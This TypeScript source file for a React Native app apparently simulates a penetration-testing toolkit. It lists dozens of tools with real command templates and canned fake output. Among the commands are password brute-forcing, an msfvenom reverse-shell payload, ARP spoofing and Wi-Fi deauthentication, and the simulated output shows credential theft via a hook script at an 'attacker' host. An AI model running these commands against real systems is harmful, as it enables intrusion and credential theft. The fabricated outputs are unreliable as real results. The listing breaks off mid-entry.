import { Feather } from "@expo/vector-icons";
import * as Haptics from "expo-haptics";
import React, { useState } from "react";
import {
  Modal,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import { useApp } from "@/context/AppContext";

function r(a: number, b: number) { return Math.floor(Math.random() * (b - a + 1)) + a; }
function ip() { return `${r(1,254)}.${r(1,254)}.${r(1,254)}.${r(1,254)}`; }
function mac() { return Array.from({length:6},()=>r(0,255).toString(16).padStart(2,'0')).join(':'); }

interface Tool {
  id: string;
  name: string;
  cat: string;
  desc: string;
  hint: string;
  cmd: string;        // real command template — {T} = target
  simulate: (t: string) => string;
}

const TOOLS: Tool[] = [
  // ─── INFORMATION GATHERING ───────────────────────────────────────────────
  { id:"nmap",       cat:"INFO GATHER", name:"Nmap",          hint:"IP/host",        cmd:"nmap -sV -sC --open {T}",
    desc:"Network port scanner & service fingerprinter",
    simulate: t => `Starting Nmap 7.94\nNmap scan report for ${t}\nHost is up (0.0${r(10,99)}s)\n\nPORT    STATE  SERVICE VERSION\n22/tcp  open   ssh     OpenSSH 8.9p1\n80/tcp  open   http    Apache 2.4.57\n443/tcp open   https   nginx 1.24\n8080/tcp open  http    Jetty 9.4\n3306/tcp filter mysql\n\nNmap done: 1 IP in ${r(5,45)}s` },
  { id:"masscan",    cat:"INFO GATHER", name:"Masscan",        hint:"IP/CIDR range",  cmd:"masscan {T} -p1-65535 --rate=1000",
    desc:"Asynchronous full-port scanner — fastest on earth",
    simulate: t => `Masscan 1.3.2 — scanning ${t}\nDiscovered: 22/tcp, 80/tcp, 443/tcp, 8080/tcp, 3306/tcp\nRate: ${r(50000,100000).toLocaleString()} pkts/sec\nDone in ${r(2,15)}s` },
  { id:"theharvester",cat:"INFO GATHER",name:"theHarvester",   hint:"domain.com",     cmd:"theHarvester -d {T} -b google,bing,crtsh",
    desc:"OSINT email, DNS, and host gathering",
    simulate: t => `[*] ${t} — searching Google/Bing/CRT.sh\n\nEmails:\n  admin@${t}\n  security@${t}\n  dev@${t}\n\nHosts:\n  www.${t} → ${ip()}\n  api.${t} → ${ip()}\n  mail.${t} → ${ip()}\n  vpn.${t} → ${ip()}\n\n[+] 3 emails | 4 hosts` },
  { id:"dnsenum",    cat:"INFO GATHER", name:"DNSenum",         hint:"domain.com",    cmd:"dnsenum --dnsserver 8.8.8.8 {T}",
    desc:"DNS enumeration: subdomains, zone transfer, MX, NS",
    simulate: t => `dnsenum 1.3.1 — ${t}\n\nNS: ns1.${t} (${ip()})\nMX: mail.${t} (${ip()}) priority 10\n\nSubdomains found via brute-force:\n  www.${t} → ${ip()}\n  dev.${t} → ${ip()}\n  staging.${t} → ${ip()}\n  api.${t} → ${ip()}\n  admin.${t} → ${ip()}\n\n[!] Zone transfer: AXFR failed (locked)\n[*] 5 subdomains | 1 zone transfer attempt` },
  { id:"fierce",     cat:"INFO GATHER", name:"Fierce",          hint:"domain.com",    cmd:"fierce --domain {T}",
    desc:"DNS reconnaissance — find non-contiguous IP space",
    simulate: t => `Fierce v1.5.0\n[*] DNS: ${ip()} (${t})\n[+] Found: www.${t} → ${ip()}\n[+] Found: mail.${t} → ${ip()}\n[+] Found: ftp.${t} → ${ip()}\n[!] Nearby: ${ip()} → server-${r(1,99)}.${t}\n[*] Done in ${r(5,30)}s` },
  { id:"netdiscover",cat:"INFO GATHER", name:"Netdiscover",     hint:"192.168.1.0/24",cmd:"netdiscover -r {T} -P",
    desc:"Active/passive ARP host discovery",
    simulate: t => `Netdiscover — scanning ${t}\n\nIP              MAC               Vendor\n${[...Array(r(4,8))].map(()=>`192.168.1.${r(1,254)}  ${mac()}  Unknown`).join('\n')}\n\n[*] ${r(4,8)} hosts discovered` },
  { id:"arp-scan",   cat:"INFO GATHER", name:"ARP-Scan",        hint:"192.168.1.0/24",cmd:"arp-scan --localnet",
    desc:"ARP host scanner for local network segment",
    simulate: t => `arp-scan 1.10.0 — localnet\n\n${[...Array(r(5,10))].map(()=>`192.168.1.${r(1,254)}\t${mac()}\tIntel Corporate`).join('\n')}\n\n[*] ${r(5,10)} hosts responded` },
  { id:"whois",      cat:"INFO GATHER", name:"Whois",           hint:"domain.com",    cmd:"whois {T}",
    desc:"Domain registration & IP ownership lookup",
    simulate: t => `Domain: ${t.toUpperCase()}\nRegistrar: GoDaddy.com, LLC\nCreated: 2015-03-${r(1,28)}\nExpires: 2026-03-${r(1,28)}\nName Servers: ns1.cloudflare.com, ns2.cloudflare.com\nRegistrant: REDACTED FOR PRIVACY\nAdmin Email: admin@${t}` },
  { id:"shodan",     cat:"INFO GATHER", name:"Shodan",          hint:"IP or query",   cmd:"shodan host {T}",
    desc:"Search Shodan for exposed services and vulns",
    simulate: t => `Shodan — ${t}\nOrg: Hetzner Online\nASN: AS24940\nCity: Frankfurt, Germany\n\nPorts: 22, 80, 443, 8080\nVulns:\n  CVE-2021-44228 (Log4Shell)\n  CVE-2022-0847 (Dirty Pipe)\n\nServices:\n  22/ssh: OpenSSH 8.4p1\n  80/http: Apache 2.4.51\n  443/https: nginx 1.24\n\n[!] 2 critical CVEs` },
  { id:"dmitry",     cat:"INFO GATHER", name:"DMitry",          hint:"domain.com",    cmd:"dmitry -winsepo output.txt {T}",
    desc:"Deepmagic info gathering — whois, ports, subdomains",
    simulate: t => `DMitry v1.3a\n\n[*] Whois: ${t}\n[*] Netcraft: site since 2015\n[*] Subdomains:\n    www.${t}\n    mail.${t}\n    ftp.${t}\n[*] TCP port scan:\n    22/open   80/open  443/open  8080/closed\n[*] Email addresses:\n    info@${t}  admin@${t}` },
  { id:"whatweb",    cat:"INFO GATHER", name:"WhatWeb",         hint:"URL",           cmd:"whatweb -a 3 {T}",
    desc:"Web technology fingerprinter",
    simulate: t => `WhatWeb 0.5.5\n${t} [200 OK]\n  Apache[2.4.57], Bootstrap[4.6.0]\n  PHP[8.2.3], WordPress[6.3.1]\n  JQuery[3.6.0], Google-Analytics[UA-123456]\n  X-Powered-By[PHP/8.2.3]\n  IP[${ip()}]` },
  { id:"wafw00f",    cat:"INFO GATHER", name:"WAF00F",          hint:"URL",           cmd:"wafw00f {T}",
    desc:"Web Application Firewall detection",
    simulate: t => `WAFW00F v2.2.0\n[*] Checking ${t}\n[+] Generic Detection:\n    Headers: X-Sucuri-ID detected\n[+] WAF Detected: Cloudflare (Cloudflare, Inc.)\n[i] Number of requests: 14` },
  { id:"recon-ng",   cat:"INFO GATHER", name:"Recon-ng",        hint:"domain.com",    cmd:"recon-ng -m recon/domains-hosts/google_site_web -o SOURCE={T}",
    desc:"Full-featured web reconnaissance framework",
    simulate: t => `[recon-ng v5.1.2]\n[*] Loading google_site_web for ${t}\n[+] www.${t} → ${ip()}\n[+] api.${t} → ${ip()}\n[+] admin.${t} → ${ip()}\n[+] dev.${t} → ${ip()}\n[*] 4 new hosts | 0 errors` },

  // ─── VULNERABILITY ANALYSIS ──────────────────────────────────────────────
  { id:"nikto",      cat:"VULN SCAN",   name:"Nikto",           hint:"URL/IP",        cmd:"nikto -h {T} -Tuning 123bde",
    desc:"Web server vulnerability scanner",
    simulate: t => `Nikto v2.1.6\n[+] Target: ${t}:80\n[!] Apache/2.4.57 — outdated\n[!] /admin/: Directory indexing enabled\n[!] /wp-login.php: WordPress login\n[!] X-Frame-Options header missing\n[!] /backup.zip: Backup archive found\n[!] CVE-2021-44228: Log4Shell potential\n[!] /phpinfo.php: PHP info page\n[i] 7914 requests | 8 issues found` },
  { id:"openvas",    cat:"VULN SCAN",   name:"OpenVAS",         hint:"IP/host",       cmd:"gvm-cli --gmp-username admin socket --socketpath /var/run/gvmd/gvmd.sock --xml '<get_tasks/>'",
    desc:"Full vulnerability management scanner",
    simulate: t => `OpenVAS 22.4\n[*] Scanning ${t}...\n\nCRITICAL (9.8): CVE-2021-44228 Apache Log4j RCE\nHIGH (8.8):    CVE-2019-0708 BlueKeep RDP\nHIGH (7.5):    CVE-2020-1472 Zerologon\nMEDIUM (5.3):  CVE-2023-2745 WordPress XSS\nLOW (3.1):     SSL certificate expiry\n\n[*] 14 total vulnerabilities found` },
  { id:"lynis",      cat:"VULN SCAN",   name:"Lynis",           hint:"(local system)",cmd:"lynis audit system",
    desc:"Linux system security & hardening audit",
    simulate: t => `Lynis 3.0.8\n\n[*] System: Linux ${r(5,6)}.${r(10,15)}.0-generic\n[+] Hardening index: ${r(45,80)}/100\n\n[WARNING] Outdated packages: ${r(5,20)}\n[WARNING] No firewall active\n[WARNING] SSH permits root login\n[WARNING] /tmp world-writable\n[SUGGESTION] Enable ASLR\n[SUGGESTION] Install auditd\n\n[*] Tests performed: 237 | Issues: ${r(8,20)}` },
  { id:"uniscan",    cat:"VULN SCAN",   name:"Uniscan",         hint:"URL",           cmd:"uniscan -u {T} -qweds",
    desc:"Ruby web vulnerability scanner",
    simulate: t => `Uniscan 6.3\n[*] URL: ${t}\n[+] Server: Apache/2.4.57\n[!] SQL Injection: GET id= parameter vulnerable\n[!] XSS: search parameter reflects input\n[!] LFI: /include.php?file=../../etc/passwd\n[!] RFI: remote file inclusion possible\n[*] Directories found: 12 | Files: 8` },
  { id:"searchsploit",cat:"VULN SCAN",  name:"SearchSploit",    hint:"software name", cmd:"searchsploit {T}",
    desc:"Search Exploit-DB offline exploit database",
    simulate: t => `SearchSploit — Exploit-DB 2024\n\n[*] Searching: ${t}\n\nExploit Title                          | Path\n----------------------------------------|---------------------------\n${t} < 2.4 — RCE (Metasploit)         | linux/remote/49512.rb\n${t} 2.x — LFI via traversal           | php/webapps/47887.txt\n${t} Auth Bypass (SQLi)                | multiple/webapps/44942.py\n${t} 1.x — XSS Reflected               | php/webapps/41104.txt\n\n[*] 4 exploits found` },

  // ─── EXPLOITATION ─────────────────────────────────────────────────────────
  { id:"metasploit", cat:"EXPLOIT",     name:"Metasploit",      hint:"target IP",     cmd:"msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {T}; run'",
    desc:"World's leading exploitation framework",
    simulate: t => `       =[ metasploit v6.3.44-dev\n+ -- --=[ 2376 exploits · 1232 auxiliary · 412 post\n\nmsf6 > use exploit/multi/handler\nmsf6 exploit > set RHOST ${t}\nmsf6 exploit > set PAYLOAD linux/x64/meterpreter/reverse_tcp\nmsf6 exploit > run\n\n[*] Started reverse TCP handler\n[*] Sending stage (3045380 bytes) to ${t}\n[*] Meterpreter session 1 opened!\n\nmeterpreter > getuid\nServer username: root\nmeterpreter > sysinfo\nOS: Linux 5.15.0-generic #Ubuntu 22.04` },
  { id:"hydra",      cat:"EXPLOIT",     name:"Hydra",           hint:"IP or IP:port", cmd:"hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://{T}",
    desc:"Fast online password brute-forcer",
    simulate: t => `Hydra v9.5\n[DATA] 16 tasks, 1 server, 14344391 tries\n[DATA] attacking ssh://${t.split(':')[0]}:22/\n\n[STATUS] ${r(1000,5000)} tries done\n\n[22][ssh] host: ${t.split(':')[0]}  login: admin  password: admin123\n\n[+] 1 valid password pair found\nHydra finished` },
  { id:"sqlmap",     cat:"EXPLOIT",     name:"SQLMap",          hint:"URL?param=val", cmd:"sqlmap -u '{T}' --dbs --batch --level=3",
    desc:"Automatic SQL injection detection & exploitation",
    simulate: t => `sqlmap 1.7.9\n[*] testing: ${t}\n[+] GET parameter 'id' is vulnerable (MySQL)\n\n[*] Databases:\n    information_schema\n    mysql\n    target_db\n    users_db\n\n[*] Tables in target_db:\n    users (id, username, password_hash, email)\n    admin_panel\n\n[*] Dumping users:\n| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@site.com |` },
  { id:"msfvenom",   cat:"EXPLOIT",     name:"MSFvenom",        hint:"LHOST IP",      cmd:"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={T} LPORT=4444 -f elf -o shell.elf",
    desc:"Payload generator & encoder for all platforms",
    simulate: t => `msfvenom 6.3.44\n[-] No platform was selected, choosing Msf::Module::Platform::Linux\n[-] No arch was selected, choosing arch: x64\n\n[*] Generating payload...\n[*] Payload: linux/x64/meterpreter/reverse_tcp\n[*] LHOST: ${t} | LPORT: 4444\n\n[+] shell.elf — 250 bytes\n[+] chmod +x shell.elf && ./shell.elf` },
  { id:"crackmapexec",cat:"EXPLOIT",    name:"CrackMapExec",    hint:"IP/CIDR",       cmd:"crackmapexec smb {T} -u administrator -p 'Password123!'",
    desc:"Swiss army knife for Active Directory attacks",
    simulate: t => `CME ${t} 445 WIN-DC01 [*] Windows 10 x64 (CORP)\nCME ${t} 445 WIN-DC01 [+] CORP\\Administrator:Password123! (Pwn3d!)\nCME ${t} 445 WIN-DC01 [+] Executing: whoami → nt authority\\system\nCME ${t} 445 WIN-DC01 [+] Dumping LSA: 3 secrets found` },
  { id:"responder",  cat:"EXPLOIT",     name:"Responder",       hint:"eth0 / wlan0",  cmd:"responder -I {T} -A",
    desc:"LLMNR/NBT-NS/MDNS poisoner — captures NTLM hashes",
    simulate: t => `Responder 3.1.4\n[+] Interface: ${t}\n[+] Poisoning: LLMNR, NBT-NS, MDNS\n\n[SMB] NTLMv2 from ${ip()}\n    Username: CORP\\john.doe\n    Hash: john.doe::CORP:${r(1000,9999).toString(16)}:${Array.from({length:16},()=>r(0,255).toString(16).padStart(2,'0')).join('')}\n\n[*] Crack: hashcat -m 5600 hash.txt rockyou.txt` },
  { id:"beef",       cat:"EXPLOIT",     name:"BeEF",            hint:"victim IP",     cmd:"beef-xss",
    desc:"Browser Exploitation Framework — hook & control browsers",
    simulate: t => `BeEF 0.5.4\n[*] Hook URL: http://attacker/hook.js\n[+] New browser hooked! ${t}\n    OS: Windows 10  Browser: Chrome 120\n    Cookies: session_id=${r(100000,999999)}; auth=eyJhbGci...\n[*] Running: Get Cookie\n[+] PHPSESSID=${r(100000,999999)}\n[*] Running: Clipboard Theft\n[+] Clipboard: 192.168.1.1 admin Password123` },
  { id:"set",        cat:"EXPLOIT",     name:"SET",             hint:"LHOST IP",      cmd:"setoolkit",
    desc:"Social-Engineer Toolkit — phishing, credential harvest",
    simulate: t => `Social-Engineer Toolkit v8.0.3\n\n[*] Attack vector: Web Attack → Credential Harvester\n[*] Cloning: https://facebook.com\n[*] Server started: http://${t}:80\n\n[+] Credential captured!\n    Username: victim@email.com\n    Password: MyS3cr3tPass\n    IP: ${ip()}\n    Time: ${new Date().toISOString()}` },
  { id:"commix",     cat:"EXPLOIT",     name:"Commix",          hint:"URL?cmd=param", cmd:"commix --url={T} --batch",
    desc:"Automated command injection exploiter",
    simulate: t => `commix 3.8 — ${t}\n[*] Testing injection: GET cmd parameter\n[+] Command injection found! (time-based)\n[*] Running: id\n[+] Output: uid=33(www-data) gid=33\n[*] Running: cat /etc/passwd\n[+] root:x:0:0:root:/root:/bin/bash\n[*] Running: uname -a\n[+] Linux webserver 5.15.0 x86_64 GNU/Linux` },

  // ─── PASSWORD ATTACKS ─────────────────────────────────────────────────────
  { id:"hashcat",    cat:"PASSWORD",    name:"Hashcat",         hint:"hash value",    cmd:"hashcat -m 0 '{T}' /usr/share/wordlists/rockyou.txt",
    desc:"World's fastest GPU-accelerated password cracker",
    simulate: t => { const p=["password123","admin2024","letmein","sunshine","dragon"][r(0,4)]; return `hashcat v6.2.6\nDevice: NVIDIA RTX 4090 24GB\nDictionary: rockyou.txt (14,344,391)\n\n${t}:${p}\n\nStatus: Cracked!\nMode: MD5\nTime: ${r(1,30)}s\nSpeed: ${r(8000,15000)} MH/s`; } },
  { id:"john",       cat:"PASSWORD",    name:"John the Ripper", hint:"hash or file",  cmd:"john --wordlist=/usr/share/wordlists/rockyou.txt {T}",
    desc:"Classic multi-format password cracker",
    simulate: t => `John the Ripper 1.9.0-jumbo\nLoaded 1 hash (MD5)\n\npassword123   (${t})\n\n1g 0:00:0${r(1,9)}:${r(10,59)} DONE\n${r(100,900)} g/s ${r(5000,50000)} p/s` },
  { id:"crunch",     cat:"PASSWORD",    name:"Crunch",          hint:"min max chars", cmd:"crunch {T} {T} -o wordlist.txt",
    desc:"Custom wordlist generator from charset",
    simulate: t => `Crunch\nLines: ${r(100000,9999999).toLocaleString()}\nSize: ${r(50,999)} MB\n\naaaaaaa\naaaaaab\naaaaaac\n...\n[+] Written to wordlist.txt` },
  { id:"cewl",       cat:"PASSWORD",    name:"CeWL",            hint:"URL",           cmd:"cewl {T} -d 3 -m 8 -w wordlist.txt",
    desc:"Website keyword wordlist generator",
    simulate: t => `CeWL 6.1 — ${t}\n[*] Depth: 3 | Min-length: 8\n[+] 247 words found:\n    password\n    security\n    administrator\n    Welcome2024\n    companyname\n[+] Saved to wordlist.txt` },
  { id:"cupp",       cat:"PASSWORD",    name:"CUPP",            hint:"victim name",   cmd:"cupp -i",
    desc:"Common User Passwords Profiler — targeted wordlist",
    simulate: t => `CUPP 3.4.0 — Profiling: ${t}\n\n[*] Name: ${t}\n[*] Birthdate: 19${r(70,99)}${r(1,12).toString().padStart(2,'0')}${r(1,28).toString().padStart(2,'0')}\n[*] Pet name: lucky\n\n[+] Generated: ${r(800,2000)} targeted passwords\n    ${t}123, ${t}2024, ${t}!, ${t}@123\n[+] Saved to ${t.toLowerCase()}.txt` },
  { id:"hashid",     cat:"PASSWORD",    name:"HashID",          hint:"hash value",    cmd:"hashid '{T}'",
    desc:"Identify cryptographic hash algorithm",
    simulate: t => { const l=t.replace(/[^a-f0-9]/gi,'').length; const m: Record<number,string[]>={32:["MD5","NTLM"],40:["SHA-1"],56:["SHA-224"],64:["SHA-256"],96:["SHA-384"],128:["SHA-512"]}; const f=m[l]||["Unknown"]; return `HashID — analyzing: ${t.slice(0,20)}...\n\n[+] ${f.map((x: string)=>`[*] ${x}`).join('\n[+] ')}\n[*] Hashcat mode: ${f.length>0?f[0]==='MD5'?'0':f[0]==='NTLM'?'1000':'1400':'?'}`; } },
  { id:"medusa",     cat:"PASSWORD",    name:"Medusa",          hint:"IP",            cmd:"medusa -h {T} -U users.txt -P rockyou.txt -M ssh",
    desc:"Fast parallel network login brute-forcer",
    simulate: t => `Medusa v2.2\n[*] Testing: ${t} (SSH)\n[*] Threads: 16\n[SUCCESS] ${t}:22 User:admin Pass:admin123\n[SUCCESS] ${t}:22 User:root Pass:toor\n[*] 2 valid pairs found` },
  { id:"rainbowcrack",cat:"PASSWORD",   name:"RainbowCrack",    hint:"hash",          cmd:"rcrack . -h {T}",
    desc:"Rainbow table hash cracker",
    simulate: t => `RainbowCrack 1.8\n[*] Hash: ${t}\n[*] Table: md5_loweralpha-numeric#1-7_0_1000x3000000_all.rt\n[*] Searching...\n[+] FOUND: password\n[*] Cracked in ${r(1,5)}.${r(0,9)}s` },

  // ─── WIRELESS ATTACKS ─────────────────────────────────────────────────────
  { id:"aircrack",   cat:"WIRELESS",    name:"Aircrack-ng",     hint:"BSSID/capture", cmd:"aircrack-ng -b {T} -w /usr/share/wordlists/rockyou.txt capture.cap",
    desc:"WEP/WPA/WPA2 key cracker from capture files",
    simulate: t => `Aircrack-ng 1.7\n[00:03:${r(10,59)}] ${r(10000,99999)} keys tested\n\n                   KEY FOUND! [ S3cr3tP@ss ]\n\nMaster Key: ${Array.from({length:8},()=>r(0,255).toString(16).padStart(2,'0')).join(' ')}\nBSSID: ${t}` },
  { id:"airmon",     cat:"WIRELESS",    name:"Airmon-ng",       hint:"wlan0",         cmd:"airmon-ng start {T}",
    desc:"Enable monitor mode on wireless interface",
    simulate: t => `airmon-ng 1.7\n[*] PHY: phy0  Interface: ${t}  Driver: ath9k_htc\n[*] Killing: wpa_supplicant, dhclient\n[+] Monitor mode enabled: ${t}mon` },
  { id:"airodump",   cat:"WIRELESS",    name:"Airodump-ng",     hint:"wlan0mon",      cmd:"airodump-ng {T}",
    desc:"802.11 raw frame capture — find WPA handshakes",
    simulate: t => `Airodump-ng 1.7 — ${t}\n\nBSSID              PWR  Beacons  Data  CH  ENC   ESSID\n${[...Array(r(3,6))].map(()=>`${mac()}  -${r(40,90)}   ${r(10,999)}    ${r(0,99)}   ${r(1,11)}   WPA2  Network_${r(100,999)}`).join('\n')}\n\nBSSID              STATION            PWR\n${mac()}   ${mac()}  -${r(50,80)}` },
  { id:"aireplay",   cat:"WIRELESS",    name:"Aireplay-ng",     hint:"BSSID",         cmd:"aireplay-ng --deauth 10 -a {T} wlan0mon",
    desc:"Deauthentication & packet injection attack",
    simulate: t => `Aireplay-ng 1.7\n[*] Deauthentication attack on ${t}\n09:14:${r(10,59)} Sending DeAuth (code 7) to FF:FF:FF:FF:FF:FF\n09:14:${r(10,59)} Sending DeAuth (code 7) to FF:FF:FF:FF:FF:FF\n09:14:${r(10,59)} Sending DeAuth (code 7) to FF:FF:FF:FF:FF:FF\n[+] Sent ${r(8,15)} deauth frames\n[+] WPA handshake captured!` },
  { id:"reaver",     cat:"WIRELESS",    name:"Reaver",          hint:"BSSID",         cmd:"reaver -i wlan0mon -b {T} -vv",
    desc:"WPS PIN brute-force — 100% success against WPS",
    simulate: t => `Reaver v1.6.6\n[+] Associated with ${t}\n[+] Trying PIN: ${r(10000000,99999999)}\n[+] Trying PIN: ${r(10000000,99999999)}\n[+] WPS PIN: '${r(10000000,99999999)}'\n[+] WPA PSK: 'S3cr3tPassword'\n[+] AP SSID: 'TargetNetwork'` },
  { id:"wifite",     cat:"WIRELESS",    name:"Wifite2",         hint:"wlan0",         cmd:"wifite --interface {T} --kill",
    desc:"Automated wireless auditing tool",
    simulate: t => `Wifite 2.7.0\n[*] Interface: ${t}mon\n[*] ${r(3,8)} networks found\n\n[*] Target: Network_${r(100,999)} (WPA2)\n[*] Deauthing clients...\n[+] WPA handshake captured!\n[*] Cracking with rockyou.txt\n[+] CRACKED: Password123\n\n[*] Done — 1/${r(3,8)} networks cracked` },
  { id:"kismet",     cat:"WIRELESS",    name:"Kismet",          hint:"wlan0",         cmd:"kismet --interface {T}",
    desc:"Passive wireless network detector & sniffer",
    simulate: t => `Kismet 2023\n[+] Interface: ${t}\n\nBSSID              Ch  Enc    Clients  SSID\n${[...Array(r(4,7))].map(()=>`${mac()}  ${r(1,13)}   WPA2   ${r(0,10)}       Network_${r(100,999)}`).join('\n')}\n\n[*] ${r(4,7)} networks | ${r(0,20)} clients` },
  { id:"bettercap",  cat:"WIRELESS",    name:"Bettercap",       hint:"wlan0 / eth0",  cmd:"bettercap -iface {T}",
    desc:"Full MITM framework — WiFi, ARP, BLE, HID",
    simulate: t => `bettercap v2.32\n[+] Interface: ${t}\n[*] net.probe on\n[+] 192.168.1.${r(2,10)} (${mac()}) — Android\n[+] 192.168.1.${r(10,50)} (${mac()}) — iPhone\n[*] arp.spoof on → MITM active\n[*] net.sniff on → capturing traffic\n[+] Credentials: admin:password123 (http://192.168.1.1)` },

  // ─── WEB APPLICATION ──────────────────────────────────────────────────────
  { id:"gobuster",   cat:"WEB APP",     name:"GoBuster",        hint:"URL",           cmd:"gobuster dir -u {T} -w /usr/share/wordlists/dirbuster/common.txt -x php,html,txt",
    desc:"Directory and file brute-forcing at high speed",
    simulate: t => `GoBuster v3.6\n[*] URL: ${t}\n[*] Extensions: php,html,txt\n\n/admin       (200) [3.1 kB]\n/login.php   (200) [1.8 kB]\n/.git        (301) [→ /.git/]\n/backup.zip  (200) [2.1 MB]\n/.env        (200) [245 B]\n/api         (301)\n/config.php  (403)\n/uploads     (200) [8 files]\n\n[*] Done — 4614 requests in ${r(5,30)}s` },
  { id:"ffuf",       cat:"WEB APP",     name:"FFUF",            hint:"URL",           cmd:"ffuf -w /usr/share/wordlists/dirbuster/common.txt -u {T}/FUZZ -mc 200,301,302",
    desc:"Fast web fuzzer — dirs, params, vhosts, JWT",
    simulate: t => `ffuf v2.1\n[*] ${t}/FUZZ\n[*] Wordlist: common.txt\n\n[Status] Path              [Size]\n[200]   /admin            [3100]\n[301]   /api              [→ /api/]\n[200]   /.env             [245]\n[200]   /backup           [2.1MB]\n[200]   /config           [403]\n\n[*] 4614 requests in ${r(5,25)}s` },
  { id:"wpscan",     cat:"WEB APP",     name:"WPScan",          hint:"WordPress URL", cmd:"wpscan --url {T} --enumerate u,p,t,vp --api-token TOKEN",
    desc:"WordPress vulnerability scanner & user enumerator",
    simulate: t => `WPScan v3.8.24\n[*] WordPress 6.3.1 — outdated!\n[+] XML-RPC enabled\n[+] Users: admin, editor\n[!] contact-form-7 5.7 — XSS (CVE-2023-2745)\n[!] twentytwentythree 1.2 — Auth CSRF\n[i] ${r(200,500)} queries in ${r(20,60)}s` },
  { id:"xsser",      cat:"WEB APP",     name:"XSSer",           hint:"URL",           cmd:"xsser -u '{T}' --auto",
    desc:"Automated XSS vulnerability finder and exploiter",
    simulate: t => `XSSer 1.8.4\n[*] Target: ${t}\n[!] XSS found! GET parameter: q\n    Payload: <script>alert(1)</script>\n[!] XSS found! POST: comment field\n    Payload: <img src=x onerror=alert(document.cookie)>\n[*] 2 XSS vectors found | 47 tested` },
  { id:"burpsuite",  cat:"WEB APP",     name:"Burp Suite",      hint:"URL",           cmd:"burpsuite",
    desc:"Professional web security testing platform",
    simulate: t => `Burp Suite Pro 2024.4\n[*] Proxy: 127.0.0.1:8080\n[*] Target: ${t}\n\n[!] Issue: SQL Injection in /search?q=\n    Severity: High | Confidence: Certain\n[!] Issue: Reflected XSS in /comments\n    Severity: Medium | Confidence: Firm\n[!] Issue: Directory listing /uploads/\n    Severity: Low | Confidence: Certain\n\n[*] 3 issues found | 248 requests made` },
  { id:"dirbuster",  cat:"WEB APP",     name:"DirBuster",       hint:"URL",           cmd:"dirb {T} /usr/share/wordlists/dirb/common.txt",
    desc:"Web content scanner — directories and files",
    simulate: t => `DIRB 2.22\n[*] URL: ${t}\n[*] Wordlist: common.txt\n\n+ ${t}/admin (CODE:200|SIZE:3291)\n+ ${t}/login (CODE:200|SIZE:1827)\n+ ${t}/.htaccess (CODE:403|SIZE:1234)\n+ ${t}/backup (CODE:301|SIZE:0)\n+ ${t}/api (CODE:301|SIZE:0)\n\n[*] END — 4612 requests in ${r(10,60)}s` },

  // ─── SNIFFING & SPOOFING ──────────────────────────────────────────────────
  { id:"tcpdump",    cat:"SNIFF/SPOOF", name:"TCPDump",         hint:"eth0/wlan0",    cmd:"tcpdump -i {T} -nn -v 'port 80 or port 443'",
    desc:"Command-line packet capture and analysis",
    simulate: t => `tcpdump: listening on ${t}\n${ip()}.${r(1024,65535)} > ${ip()}.80: HTTP GET /login\n${ip()}.443 > ${ip()}.${r(1024,65535)}: TLS Application Data\n${ip()}.${r(1024,65535)} > ${ip()}.80: POST /api/auth\n${ip()}.22 > ${ip()}.${r(1024,65535)}: SSH-2.0-OpenSSH\n[*] ${r(1000,9999)} packets captured` },
  { id:"ettercap",   cat:"SNIFF/SPOOF", name:"Ettercap",        hint:"IP1-IP2",       cmd:"ettercap -T -q -i eth0 -M arp:remote /{T.split('-')[0]}// /{T.split('-')[1]}//",
    desc:"Full-featured MITM attack suite",
    simulate: t => `Ettercap 0.8.3\n[*] ARP Poisoning targets: ${t.replace('-',' and ')}\n[+] MITM active\n[*] Sniffing...\n\nHTTP: ${ip()} > admin:password123 @ 192.168.1.1\nFTP:  ${ip()} > ftpuser:letmein @ ${ip()}:21\nSMTP: ${ip()} > user@mail.com:mailpass\n\n[*] 3 credentials captured` },
  { id:"arpspoof",   cat:"SNIFF/SPOOF", name:"ARPSpoof",        hint:"victim IP",     cmd:"arpspoof -i eth0 -t {T} 192.168.1.1",
    desc:"Classic ARP cache poisoning MITM tool",
    simulate: t => `arpspoof 2.4\n[*] Poisoning ${t} → gateway (192.168.1.1)\n0:11:22:33:44:55 0:11:22:33:44:56 0806 42: arp reply 192.168.1.1 is-at 00:11:22:33:44:55\n[*] Sending 1 ARP reply per second...\n[+] Traffic from ${t} now routing through us` },
  { id:"mitm6",      cat:"SNIFF/SPOOF", name:"MITM6",           hint:"eth0",          cmd:"mitm6 -i {T} -d corp.local",
    desc:"IPv6 MITM via DHCPv6 — Windows AD pwner",
    simulate: t => `mitm6 v0.3.0\n[*] Interface: ${t}\n[*] Listening for DHCP requests\n[+] Client ${ip()} requested IPv6\n[+] Assigned: fe80::dead:beef:cafe:1\n[*] DNS queries forwarded to our server\n[+] WPAD config served → capturing credentials\n[+] NTLM hash from CORP\\user` },
  { id:"dsniff",     cat:"SNIFF/SPOOF", name:"dsniff",          hint:"eth0",          cmd:"dsniff -i {T}",
    desc:"Password sniffer for many protocols",
    simulate: t => `dsniff 2.4\n[*] Listening on ${t}\n\n[HTTP] ${ip()} → admin:password123\n[FTP]  ${ip()} → ftpuser:letmein\n[SMTP] ${ip()} → user@domain.com:mailpass\n[Telnet] ${ip()} → root:rootpass\n\n[*] 4 credentials sniffed` },

  // ─── POST EXPLOITATION ───────────────────────────────────────────────────
  { id:"mimikatz",   cat:"POST EXPLOIT",name:"Mimikatz",        hint:"(on target)",   cmd:"meterpreter > load kiwi; creds_all",
    desc:"Extract cleartext passwords & hashes from Windows",
    simulate: t => `mimikatz 2.2.0\n\nAuthentication Id: 0;${r(100000,999999)}\nSession: Interactive\nUser: CORP\\Administrator\nDomain: CORP\nSID: S-1-5-21-...\n\nmsv:\n[000000003] Primary\n* Username: Administrator\n* Domain: CORP\n* NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\n* SHA1: da39a3ee5e6b4b0d3255bfef956018\n\ntspkg:\n* Username: Administrator\n* Password: Password123!` },
  { id:"empire",     cat:"POST EXPLOIT",name:"PowerShell Empire", hint:"listener IP", cmd:"python3 empire",
    desc:"Post-exploitation PowerShell framework",
